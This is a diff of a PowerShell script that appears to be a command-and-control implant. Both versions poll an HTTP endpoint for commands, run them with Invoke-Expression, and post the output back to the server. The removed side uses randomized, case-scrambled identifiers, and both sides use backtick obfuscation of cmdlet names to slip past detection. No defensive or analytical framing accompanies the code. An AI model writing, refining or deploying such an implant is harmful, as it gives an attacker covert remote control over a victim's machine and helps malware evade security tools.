@@ -1,34 +1,42 @@
+$session = nEW`-oBj`ECt Microsoft.PowerShell.Commands.WebRequestSession
+$sleep_time = 1
+function get_command {
 
-    FUNcTIoN cJNDES {
-        
-        $fLbifd = INVOkE-webReqUest "http://localhost:8080/getcommand/LdJqTg" -Headers @{"Authorization"="9775"}  
-        RETURN $fLbifd.cONtENt 
-    }
-    FUNcTIoN mAQjNX([string]$tauZTU){
-        $tauZTU  =(iex $tauZTU 2>&1 | Out-String )
-        RETURN $tauZTU
-    }
-    FUNcTIoN hDshfT([string]$command){
+    $req = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -Headers @{"Authorization"="1"} 
+    return $req.Content 
+}
+
+function run_command([string]$command){
+    $command  = (iex $command 2>&1 | Out-String )
+    return $command
+}
+function post_response([string]$command){
     
 
-        $iIWICe = @{DRyVyL=$command}
-        $req = INVOkE-webReqUest "http://localhost:8080/response/lGKHmm" -Headers @{"Authorization"="9775"} -Method POST -Body $iIWICe 
+    $postParams = @{rfile=$command}
+    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1"}  -Method POST -Body $postParams 
+}
+
+$var = 1
+
+while ($var -le 5 -and $var -ne 3)
+{
+    $command = get_command
+    $command.Trim()
+    if($command -eq "exit"){
+        exit
     }
-    $BzSeAq = 1
+    elseif($command.Trim() -eq "none"){
+    Start-S`le`ep -s 1
+
+    }
+    else{
+
+    $command = run_command($command)
     
-    wHIlE ($BzSeAq -LE 5 -ANd $BzSeAq -NE 3)
-    {
-        $tauZTU = cJNDES
-        if($tauZTU.Trim() -eq "none"){
-        Start-S`lee`P -s 2
-    
-        }
-        else{
-        $tauZTU = mAQjNX($tauZTU)
-        hDshfT($tauZTU)
-    
-        }
-        
-        Start-S`lee`P -s 2
+    post_response($command)
+
     }
     
+    Start-Sleep -s 1
+}
